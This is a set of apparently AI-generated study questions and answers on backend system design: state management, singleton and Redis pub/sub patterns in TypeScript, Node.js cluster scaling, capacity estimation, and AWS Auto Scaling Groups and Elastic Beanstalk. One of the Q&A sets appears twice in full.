**Q3: How does the stateless server architecture function according to the diagram?**  
**A3:** In the diagram, users (u1 and u2) connect to any instance of Backend1 or Backend2, which interact with a Postgres database to manage state, allowing flexible connections without server-specific dependencies.

**Q4: What are some examples of stateful servers and their use cases?**  
**A4:**  
1. **In-Memory Cache**: Stores frequently accessed data for performance (e.g., [Cache.ts](https://github.com/code100x/cms/blob/e905c71eacf9d99f68db802b24b7b3a924ae27f1/src/db/Cache.ts#L3)).  
2. **Real-Time Game State**: Holds game state for multiplayer games (e.g., [Game.ts](https://github.com/code100x/chess/blob/main/apps/ws/src/Game.ts#L41-L47)).  
3. **Chat Application**: Keeps the 10 most recent messages in memory.

**Q5: What is stickiness, and why is it necessary for stateful servers?**  
**A5:** Stickiness ensures a user connects to the specific server holding their state (e.g., a game room). It’s necessary for stateful servers because the state is stored in memory on a particular server, requiring consistent user-server pairing.

**Q6: How does the stateful server architecture work according to the diagram?**  
**A6:** In the diagram, users (u1, u2, u3) connect to specific WebSocket servers (ws1, ws2). For example, u1 and u2 connect to ws1 managing rooms 1, 2, and 3, while u3 connects to ws2 managing rooms 4, 8, and 9, reflecting the need for stickiness.

---

### Questions and Answers on State in JS Process

**Q7: How can state be managed across multiple files in a JavaScript process?**  
**A7:** State can be stored in a shared array exported from a file (e.g., `store.ts`), accessed and modified by other files like `index.ts` (pushing to the array) and `logger.ts` (reading it).

**Q8: What does the example code for state management demonstrate?**  
**A8:**  
- `store.ts`: Exports a `games` array with a `Game` interface.  
- `index.ts`: Imports `games` and pushes new game objects every 5 seconds.  
- `logger.ts`: Logs the `games` array every 4 seconds.  
This shows a shared state updated and accessed across files.

**Q9: How does the state management diagram illustrate the process?**  
**A9:** The diagram shows `index.ts` importing `games` from `store.ts` and `startLogger` from `logger.ts`. `index.ts` pushes to `games` every 5 seconds, while `logger.ts` logs it every 4 seconds, demonstrating shared state flow.

---

### Questions and Answers on Classes and Singleton Pattern

**Q10: What is the initial approach to managing state with a `GameManager` class?**  
**A10:**  
```tsx
interface Game { id: string; whitePlayer: string; blackPlayer: string; moves: string[]; }
export class GameManager {
    private games: Game[] = [];
    public addGame(game: Game) { this.games.push(game); }
    public getGames() { return this.games; }
    public addMove(gameId: string, move: string) {
        const game = this.games.find(game => game.id === gameId);
        if (game) game.moves.push(move);
    }
    public logState() { console.log(this.games); }
}
```
It uses a class with methods to add games, retrieve games, add moves, and log state.

**Q11: What is the problem with the 'Bad Approach' to using `GameManager`?**  
**A11:** Creating separate `GameManager` instances in each file (e.g., `logger.ts` and `index.ts`) leads to inconsistent states, as each instance has its own `games` array, causing potential state management issues.

**Q12: How does the 'Slightly Better Approach' improve state management?**  
**A12:** It exports a single `GameManager` instance from `GameManager.ts` (e.g., `const gameManagerInstance = new GameManager(); export { gameManagerInstance };`), ensuring all files (`logger.ts`, `index.ts`) use the same instance for consistent state.

**Q13: What is the Singleton pattern, and how is it implemented in `GameManager`?**  
**A13:** The Singleton pattern ensures only one instance of a class exists with a global access point. In `GameManager`:  
```tsx
export class GameManager {
    private static instance: GameManager;
    private games: Game[] = [];
    private constructor() {}
    public static getInstance(): GameManager {
        if (!GameManager.instance) GameManager.instance = new GameManager();
        return GameManager.instance;
    }
}
```
A private constructor and static `getInstance()` method enforce a single instance.

**Q14: Why can’t you create a new `GameManager` instance with the Singleton pattern?**  
**A14:** Attempting `new GameManager()` throws an error because the constructor is private, forcing use of `GameManager.getInstance()` to access the single instance.

**Q15: How is the Singleton `GameManager` used in the codebase?**  
**A15:**  
- `logger.ts`: Calls `GameManager.getInstance().logState()` every 4 seconds.  
- `index.ts`: Calls `GameManager.getInstance().addGame()` every 5 seconds.  
This ensures a single, shared instance across files.

---

### Questions and Answers on Pub/Sub + Singleton Pattern

**Q16: What is the Pub/Sub pattern, and how does it benefit a system?**  
**A16:** The Pub/Sub pattern is a messaging pattern where publishers send messages to channels, and subscribers receive them without direct sender-receiver coupling. It enables scalable, flexible communication for real-time updates.

**Q17: How does the Singleton pattern integrate with Pub/Sub in this context?**  
**A17:** The `PubSubManager` uses the Singleton pattern to ensure one instance manages all stock subscriptions and notifications, coordinating with a Pub/Sub system (e.g., Redis) for consistency and efficiency.

**Q18: What is the role of the `PubSubManager` in the system design?**  
**A18:** The `PubSubManager`:  
1. Tracks stocks users are interested in.  
2. Notifies the Pub/Sub system of new/removed stock interests.  
3. Relays stock price updates to relevant sockets.

**Q19: How does the Pub/Sub architecture diagram illustrate the system?**  
**A19:** The diagram shows users (u1, u4) interested in APPL stock connecting via WebSocket (ws1, ws4). The Pub/Sub system receives updates (e.g., "APPL -> $400.2") and relays them to ws1 and ws4, managed by the `PubSubManager`.

---

### Questions and Answers on Implementation of Pub/Sub

**Q20: How do you start a Redis-based Pub/Sub system?**  
**A20:**  
1. Start Redis with Docker: `docker run -d -p 6379:6379 redis`.  
2. Open two terminals, connect with `docker exec -it <container_id> /bin/bash`, and use `redis-cli` to test publishing/subscribing.

**Q21: How do you set up a Node.js project for the `PubSubManager`?**  
**A21:**  
1. Initialize: `npm init -y`, `npx tsc --init`.  
2. Install Redis: `npm install redis`.

**Q22: What does the `PubSubManager` class do in its implementation?**  
**A22:**  
```tsx
import { createClient, RedisClientType } from 'redis';
export class PubSubManager {
    private static instance: PubSubManager;
    private redisClient: RedisClientType;
    private subscriptions: Map<string, string[]>;
    private constructor() {
        this.redisClient = createClient();
        this.redisClient.connect();
        this.subscriptions = new Map();
    }
    public static getInstance(): PubSubManager {
        if (!PubSubManager.instance) PubSubManager.instance = new PubSubManager();
        return PubSubManager.instance;
    }
    public userSubscribe(userId: string, stock: string) {
        if (!this.subscriptions.has(stock)) this.subscriptions.set(stock, []);
        this.subscriptions.get(stock)?.push(userId);
        if (this.subscriptions.get(stock)?.length === 1) {
            this.redisClient.subscribe(stock, (message) => this.handleMessage(stock, message));
            console.log(`Subscribed to Redis channel: ${stock}`);
        }
    }
    public userUnSubscribe(userId: string, stock: string) {
        this.subscriptions.set(stock, this.subscriptions.get(stock)?.filter((sub) => sub !== userId) || []);
        if (this.subscriptions.get(stock)?.length === 0) {
            this.redisClient.unsubscribe(stock);
            console.log(`UnSubscribed to Redis channel: ${stock}`);
        }
    }
    private handleMessage(stock: string, message: string) {
        console.log(`Message received on channel ${stock}: ${message}`);
        this.subscriptions.get(stock)?.forEach((sub) => console.log(`Sending message to user: ${sub}`));
    }
    public async disconnect() { await this.redisClient.quit(); }
}
```
It manages stock subscriptions using Redis, subscribes/unsubscribes to channels, and relays messages to users.

**Q23: How is the `PubSubManager` tested in `index.ts`?**  
**A23:**  
```tsx
import { PubSubManager } from "./PubSubManager";
setInterval(() => {
    PubSubManager.getInstance().userSubscribe(Math.random().toString(), "APPL");
}, 5000);
```
It simulates users subscribing to the "APPL" stock every 5 seconds.

**Q24: What are the benefits of combining Pub/Sub and Singleton in this system?**  
**A24:** It ensures scalability and consistency by using one `PubSubManager` instance to manage subscriptions and relay real-time stock updates efficiently to over 1 million users via Redis Pub/Sub.

---

### Verification of Coverage
These 24 questions and answers cover stateful vs. stateless backends, state management in JS, the singleton pattern’s evolution, and the Pub/Sub pattern with its singleton implementation. All key concepts, code snippets, and diagrams from the content are addressed. Let me know if you need further elaboration!

Here are questions and answers based on the "Week 22.1" lecture content about vertical and horizontal scaling, single-threaded and multi-threaded architectures, implementing horizontal scaling in Node.js, and capacity estimation. These are designed to build a strong conceptual understanding of the topics, with answers sourced directly from the provided content.

---

### Questions and Answers on Vertical Scaling

**Q1: What is vertical scaling, and how does it work?**  
**A1:** Vertical scaling, also known as scaling up, refers to increasing the capacity of a single machine or instance by upgrading its hardware resources, such as CPU, RAM, or storage, to handle more load or workload.

**Q2: What characterizes single-threaded languages like JavaScript?**  
**A2:** Single-threaded languages like JavaScript execute code in a single sequence or thread, processing one task at a time. This simplifies programming by avoiding race conditions and deadlocks but limits the use of multiple CPU cores for parallel processing.

**Q3: How does JavaScript demonstrate single-threaded behavior in an infinite loop?**  
**A3:** In this example:  
```jsx
let c = 0;
while (1) {
  c++;
}
```
The infinite loop increments `c` continuously, consuming 100% of a single CPU core, showing that JavaScript operates on one thread and doesn’t utilize additional cores.

**Q4: What are multi-threaded languages, and how do they differ from single-threaded ones?**  
**A4:** Multi-threaded languages, like Rust, manage multiple threads concurrently, leveraging multiple CPU cores for better performance in parallelizable workloads, unlike single-threaded languages that are limited to one thread.

**Q5: How does Rust utilize multiple CPU cores in an example?**  
**A5:** In this Rust code:  
```rust
use std::thread;
fn main() {
    for _ in 0..3 {
        thread::spawn(|| {
            let mut counter: f64 = 0.00;
            loop {
                counter += 0.001;
            }
        });
    }
    loop {}
}
```
Three threads are spawned, each running an infinite loop, utilizing multiple CPU cores, with each thread consuming a portion of available resources.

**Q6: What complexities do multi-threaded languages introduce?**  
**A6:** Multi-threaded languages introduce complexity in thread synchronization, shared memory access, and potential race conditions, requiring mechanisms like mutexes or message passing to ensure thread safety and avoid data corruption.

---

### Questions and Answers on Implementing Horizontal Scaling in Node.js

**Q7: Why is horizontal scaling beneficial for Node.js, and how does the cluster module help?**  
**A7:** Node.js, being single-threaded, benefits from horizontal scaling to use multiple CPU cores by distributing workload across processes. The cluster module creates and manages worker processes to leverage all available cores efficiently.

**Q8: How is horizontal scaling implemented in a Node.js project using the cluster module?**  
**A8:**  
```jsx
import express from "express";
import cluster from "cluster";
import os from "os";
const totalCPUs = os.cpus().length;
const port = 3000;
if (cluster.isPrimary) {
  console.log(`Number of CPUs is ${totalCPUs}`);
  console.log(`Primary ${process.pid} is running`);
  for (let i = 0; i < totalCPUs; i++) {
    cluster.fork();
  }
  cluster.on("exit", (worker) => {
    console.log(`worker ${worker.process.pid} died`);
    console.log("Let's fork another worker!");
    cluster.fork();
  });
} else {
  const app = express();
  console.log(`Worker ${process.pid} started`);
  app.get("/", (req, res) => res.send("Hello World!"));
  app.get("/api/:n", (req, res) => {
    let n = parseInt(req.params.n);
    let count = 0;
    if (n > 5000000000) n = 5000000000;
    for (let i = 0; i <= n; i++) count += i;
    res.send(`Final count is ${count} ${process.pid}`);
  });
  app.listen(port, () => console.log(`App listening on port ${port}`));
}
```
The primary process forks workers equal to CPU cores, and each worker runs an Express app, distributing requests across processes.

**Q9: What happens when a worker process dies in this implementation?**  
**A9:** The `cluster.on("exit")` event listener detects a worker’s death, logs it (e.g., `worker 67890 died`), and forks a new worker to replace it, ensuring continuous operation.

**Q10: Why might requests from the same browser show stickiness, and how can it be mitigated?**  
**A10:** Browsers reuse persistent connections to the same worker process for performance, causing stickiness. This can be mitigated by using load balancing techniques or a reverse proxy to distribute requests evenly across workers.

---

### Questions and Answers on Capacity Estimation

**Q11: What is capacity estimation, and why is it important in system design?**  
**A11:** Capacity estimation is planning a system’s ability to handle load, crucial for scalability and reliability, especially in interviews to assess scaling, traffic spike handling, and SLA support under specific conditions.

**Q12: What are the two primary methods to scale a server?**  
**A12:**  
1. **Vertical Scaling (Scaling Up)**: Increasing resources (CPU, RAM, storage) of a single server, limited by hardware capacity.  
2. **Horizontal Scaling (Scaling Out)**: Adding more servers to distribute load, offering greater flexibility for large traffic increases.

**Q13: How can a system handle traffic spikes effectively?**  
**A13:**  
1. **Auto Scaling**: Dynamically adds/removes servers based on load.  
2. **Load Balancing**: Distributes requests across servers to prevent overload.  
3. **Caching**: Stores frequent data to reduce server load.

**Q14: What strategies ensure a system supports a specific SLA given traffic conditions?**  
**A14:**  
1. **Redundancy**: Uses multiple servers/data centers for failover.  
2. **Monitoring and Alerts**: Tracks performance and alerts for issues.  
3. **Capacity Planning**: Estimates and provisions capacity for current/projected traffic.

**Q15: What basic calculations are involved in capacity estimation?**  
**A15:**  
1. **Estimating Requests per Second (RPS)**: Based on user numbers and activity.  
2. **Determining Machine Capacity**: How many requests a machine handles based on specs and workload.  
3. **Auto Scaling**: Rules to adjust machine numbers based on load.

---

### Questions and Answers on Capacity Estimation Examples

**Q16: What components might a PayTM app’s architecture include for capacity estimation?**  
**A16:**  
- **Auto Scaling Groups**: Handle varying transaction loads.  
- **Load Balancers**: Distribute traffic.  
- **Database Sharding**: Manage large transaction data volumes.

**Q17: How does the ‘Aggregate Requests and Auto Scaling’ diagram illustrate capacity handling?**  
**A17:** The diagram shows:  
1. **Aggregate Requests**: Incoming requests are aggregated.  
2. **Auto Scaling Groups**: Scale server numbers based on load.  
3. **Auto Machines**: Up to 10 servers process requests dynamically.

**Q18: What are key considerations for a chess app’s capacity estimation?**  
**A18:**  
- **WebSockets**: Enable real-time communication.  
- **Auto Scaling**: Manage peak simultaneous players.  
- **Persistent Connections**: Maintain game state and interactions.

**Q19: How does the ‘Aggregate Number of Active People’ diagram demonstrate scaling?**  
**A19:** The diagram shows:  
1. **Aggregate Number of Active People**: Tracks 90,000 active users.  
2. **Persistent Connections**: Servers maintain user connections.  
3. **Auto Scaling Groups**: Scales up to 10 servers.  
4. **Playing Now Metric**: Indicates 88,420 active users.

---

### Verification of Coverage
These 19 questions and answers cover vertical scaling, single-threaded vs. multi-threaded architectures, horizontal scaling in Node.js with the cluster module, and capacity estimation with examples (PayTM and chess apps). All key concepts, code snippets, and diagrams from the content are addressed comprehensively. Let me know if you need further details!

Here are questions and answers based on the "Week 22.1" lecture content about vertical and horizontal scaling, single-threaded and multi-threaded architectures, implementing horizontal scaling in Node.js, and capacity estimation. These are designed to build a strong conceptual understanding of the topics, with answers sourced directly from the provided content.

---

### Questions and Answers on Vertical Scaling

**Q1: What is vertical scaling, and how does it work?**  
**A1:** Vertical scaling, also known as scaling up, refers to increasing the capacity of a single machine or instance by upgrading its hardware resources, such as CPU, RAM, or storage, to handle more load or workload.

**Q2: What characterizes single-threaded languages like JavaScript?**  
**A2:** Single-threaded languages like JavaScript execute code in a single sequence or thread, processing one task at a time. This simplifies programming by avoiding race conditions and deadlocks but limits the use of multiple CPU cores for parallel processing.

**Q3: How does JavaScript demonstrate single-threaded behavior in an infinite loop?**  
**A3:** In this example:  
```jsx
let c = 0;
while (1) {
  c++;
}
```
The infinite loop increments `c` continuously, consuming 100% of a single CPU core, showing that JavaScript operates on one thread and doesn’t utilize additional cores.

**Q4: What are multi-threaded languages, and how do they differ from single-threaded ones?**  
**A4:** Multi-threaded languages, like Rust, manage multiple threads concurrently, leveraging multiple CPU cores for better performance in parallelizable workloads, unlike single-threaded languages that are limited to one thread.

**Q5: How does Rust utilize multiple CPU cores in an example?**  
**A5:** In this Rust code:  
```rust
use std::thread;
fn main() {
    for _ in 0..3 {
        thread::spawn(|| {
            let mut counter: f64 = 0.00;
            loop {
                counter += 0.001;
            }
        });
    }
    loop {}
}
```
Three threads are spawned, each running an infinite loop, utilizing multiple CPU cores, with each thread consuming a portion of available resources.

**Q6: What complexities do multi-threaded languages introduce?**  
**A6:** Multi-threaded languages introduce complexity in thread synchronization, shared memory access, and potential race conditions, requiring mechanisms like mutexes or message passing to ensure thread safety and avoid data corruption.

---

### Questions and Answers on Implementing Horizontal Scaling in Node.js

**Q7: Why is horizontal scaling beneficial for Node.js, and how does the cluster module help?**  
**A7:** Node.js, being single-threaded, benefits from horizontal scaling to use multiple CPU cores by distributing workload across processes. The cluster module creates and manages worker processes to leverage all available cores efficiently.

**Q8: How is horizontal scaling implemented in a Node.js project using the cluster module?**  
**A8:**  
```jsx
import express from "express";
import cluster from "cluster";
import os from "os";
const totalCPUs = os.cpus().length;
const port = 3000;
if (cluster.isPrimary) {
  console.log(`Number of CPUs is ${totalCPUs}`);
  console.log(`Primary ${process.pid} is running`);
  for (let i = 0; i < totalCPUs; i++) {
    cluster.fork();
  }
  cluster.on("exit", (worker) => {
    console.log(`worker ${worker.process.pid} died`);
    console.log("Let's fork another worker!");
    cluster.fork();
  });
} else {
  const app = express();
  console.log(`Worker ${process.pid} started`);
  app.get("/", (req, res) => res.send("Hello World!"));
  app.get("/api/:n", (req, res) => {
    let n = parseInt(req.params.n);
    let count = 0;
    if (n > 5000000000) n = 5000000000;
    for (let i = 0; i <= n; i++) count += i;
    res.send(`Final count is ${count} ${process.pid}`);
  });
  app.listen(port, () => console.log(`App listening on port ${port}`));
}
```
The primary process forks workers equal to CPU cores, and each worker runs an Express app, distributing requests across processes.

**Q9: What happens when a worker process dies in this implementation?**  
**A9:** The `cluster.on("exit")` event listener detects a worker’s death, logs it (e.g., `worker 67890 died`), and forks a new worker to replace it, ensuring continuous operation.

**Q10: Why might requests from the same browser show stickiness, and how can it be mitigated?**  
**A10:** Browsers reuse persistent connections to the same worker process for performance, causing stickiness. This can be mitigated by using load balancing techniques or a reverse proxy to distribute requests evenly across workers.

---

### Questions and Answers on Capacity Estimation

**Q11: What is capacity estimation, and why is it important in system design?**  
**A11:** Capacity estimation is planning a system’s ability to handle load, crucial for scalability and reliability, especially in interviews to assess scaling, traffic spike handling, and SLA support under specific conditions.

**Q12: What are the two primary methods to scale a server?**  
**A12:**  
1. **Vertical Scaling (Scaling Up)**: Increasing resources (CPU, RAM, storage) of a single server, limited by hardware capacity.  
2. **Horizontal Scaling (Scaling Out)**: Adding more servers to distribute load, offering greater flexibility for large traffic increases.

**Q13: How can a system handle traffic spikes effectively?**  
**A13:**  
1. **Auto Scaling**: Dynamically adds/removes servers based on load.  
2. **Load Balancing**: Distributes requests across servers to prevent overload.  
3. **Caching**: Stores frequent data to reduce server load.

**Q14: What strategies ensure a system supports a specific SLA given traffic conditions?**  
**A14:**  
1. **Redundancy**: Uses multiple servers/data centers for failover.  
2. **Monitoring and Alerts**: Tracks performance and alerts for issues.  
3. **Capacity Planning**: Estimates and provisions capacity for current/projected traffic.

**Q15: What basic calculations are involved in capacity estimation?**  
**A15:**  
1. **Estimating Requests per Second (RPS)**: Based on user numbers and activity.  
2. **Determining Machine Capacity**: How many requests a machine handles based on specs and workload.  
3. **Auto Scaling**: Rules to adjust machine numbers based on load.

---

### Questions and Answers on Capacity Estimation Examples

**Q16: What components might a PayTM app’s architecture include for capacity estimation?**  
**A16:**  
- **Auto Scaling Groups**: Handle varying transaction loads.  
- **Load Balancers**: Distribute traffic.  
- **Database Sharding**: Manage large transaction data volumes.

**Q17: How does the ‘Aggregate Requests and Auto Scaling’ diagram illustrate capacity handling?**  
**A17:** The diagram shows:  
1. **Aggregate Requests**: Incoming requests are aggregated.  
2. **Auto Scaling Groups**: Scale server numbers based on load.  
3. **Auto Machines**: Up to 10 servers process requests dynamically.

**Q18: What are key considerations for a chess app’s capacity estimation?**  
**A18:**  
- **WebSockets**: Enable real-time communication.  
- **Auto Scaling**: Manage peak simultaneous players.  
- **Persistent Connections**: Maintain game state and interactions.

**Q19: How does the ‘Aggregate Number of Active People’ diagram demonstrate scaling?**  
**A19:** The diagram shows:  
1. **Aggregate Number of Active People**: Tracks 90,000 active users.  
2. **Persistent Connections**: Servers maintain user connections.  
3. **Auto Scaling Groups**: Scales up to 10 servers.  
4. **Playing Now Metric**: Indicates 88,420 active users.

---

### Verification of Coverage
These 19 questions and answers cover vertical scaling, single-threaded vs. multi-threaded architectures, horizontal scaling in Node.js with the cluster module, and capacity estimation with examples (PayTM and chess apps). All key concepts, code snippets, and diagrams from the content are addressed comprehensively. Let me know if you need further details!

Here’s a set of questions and answers based on the content:

### **Horizontal Scaling and Auto Scaling Groups in AWS**

#### **Q1: What is horizontal scaling, and how does it differ from vertical scaling?**
**A:** Horizontal scaling (scaling out) involves adding more instances or servers to handle increased load, while vertical scaling (scaling up) means upgrading the existing server’s resources (CPU, RAM, storage). Horizontal scaling is more flexible and resilient.

#### **Q2: What are Auto Scaling Groups (ASGs) in AWS?**
**A:** ASGs automatically adjust the number of EC2 instances based on predefined metrics such as CPU utilization or memory usage, ensuring optimal performance and cost efficiency.

#### **Q3: What is an Amazon Machine Image (AMI), and why is it important?**
**A:** An AMI is a pre-configured template containing the OS and application software. It allows consistent and rapid provisioning of new EC2 instances.

#### **Q4: What role does a Load Balancer play in horizontal scaling?**
**A:** A Load Balancer distributes incoming traffic across multiple instances to ensure high availability, fault tolerance, and optimized performance.

#### **Q5: What is a Target Group in AWS Auto Scaling?**
**A:** A Target Group is a logical grouping of EC2 instances that a Load Balancer directs traffic to, based on health checks and routing rules.

### **Implementing Auto Scaling Groups (ASGs)**

#### **Q6: What are the key steps to setting up an ASG in AWS?**
**A:**
1. Create an EC2 instance.
2. Install necessary software (e.g., Node.js).
3. Create an AMI from the configured instance.
4. Set up a Security Group with appropriate rules.
5. Create a Launch Template with the AMI.
6. Configure Auto Scaling Group settings (min/max instances, scaling policies).
7. Attach a Load Balancer to distribute traffic.
8. Test and monitor auto-scaling behavior.

#### **Q7: What is a Launch Template, and why is it needed for ASGs?**
**A:** A Launch Template is a reusable configuration that defines instance settings (AMI, instance type, security groups, startup scripts). It simplifies instance creation and management in ASGs.

#### **Q8: How can user data scripts be used in ASGs?**
**A:** User data scripts automate instance initialization by installing dependencies, starting applications, and configuring process managers like PM2.

#### **Q9: What is an example of a user data script for a Node.js application?**
**A:**
```bash
#!/bin/bash
export PATH=$PATH:/home/ubuntu/.nvm/versions/node/v22.0.0/bin/
npm install -g pm2
cd /home/ubuntu/week-22
pm2 start index.js
pm2 save
pm2 startup
```
This script ensures Node.js and PM2 are set up and running when an instance starts.

### **Testing and Validating Auto Scaling Groups**

#### **Q10: How can you test Auto Scaling?**
**A:**
1. Change the ASG’s minimum and maximum instance count.
2. Simulate a CPU load increase with an infinite loop:
   ```javascript
   let c = 0;
   while (1) { c++; }
   ```
3. Observe instances scaling up/down in the AWS Management Console.

#### **Q11: How can an Auto Scaling Group be controlled programmatically using the AWS SDK for Node.js?**
**A:**
```javascript
import AWS from 'aws-sdk';

AWS.config.update({
  region: 'ap-south-1',
  accessKeyId: 'YOUR_ACCESS_KEY',
  secretAccessKey: 'YOUR_ACCESS_SECRET'
});

const autoscaling = new AWS.AutoScaling();
const updateDesiredCapacity = (autoScalingGroupName, desiredCapacity) => {
  const params = {
    AutoScalingGroupName: autoScalingGroupName,
    DesiredCapacity: desiredCapacity
  };

  autoscaling.setDesiredCapacity(params, (err, data) => {
    if (err) console.log("Error", err);
    else console.log("Success", data);
  });
};

updateDesiredCapacity('node-app-1', 3);
```
This script updates the desired instance count of an ASG.

### **AWS Elastic Beanstalk**

#### **Q12: What is AWS Elastic Beanstalk, and how does it simplify deployment?**
**A:** Elastic Beanstalk is a managed service that automates infrastructure provisioning, scaling, and deployment for applications. It abstracts the complexities of setting up EC2, Load Balancers, and ASGs manually.

#### **Q13: What are the key steps to deploying a Node.js application using AWS Elastic Beanstalk?**
**A:**
1. Create a new Elastic Beanstalk application.
2. Choose the appropriate platform (e.g., Node.js).
3. Upload application code or connect a GitHub repository.
4. Configure environment settings.
5. Deploy and monitor the application.

### **Cleanup and Considerations**

#### **Q14: What steps should be taken to clean up AWS resources after testing ASGs?**
**A:**
1. Delete the Auto Scaling Group.
2. Delete the Target Group.
3. Delete the Load Balancer.
4. Delete the Launch Template.
5. Delete the AMI.
6. Terminate any remaining EC2 instances.

#### **Q15: What are the trade-offs between using Auto Scaling Groups manually vs. Elastic Beanstalk?**
**A:**
- **Auto Scaling Groups (Manual Setup)**: Offers more control and customization but requires more management effort.
- **Elastic Beanstalk**: Simplifies deployment and scaling but provides less flexibility compared to manually configuring resources.

---

Let me know if you need more questions or a different format! 🚀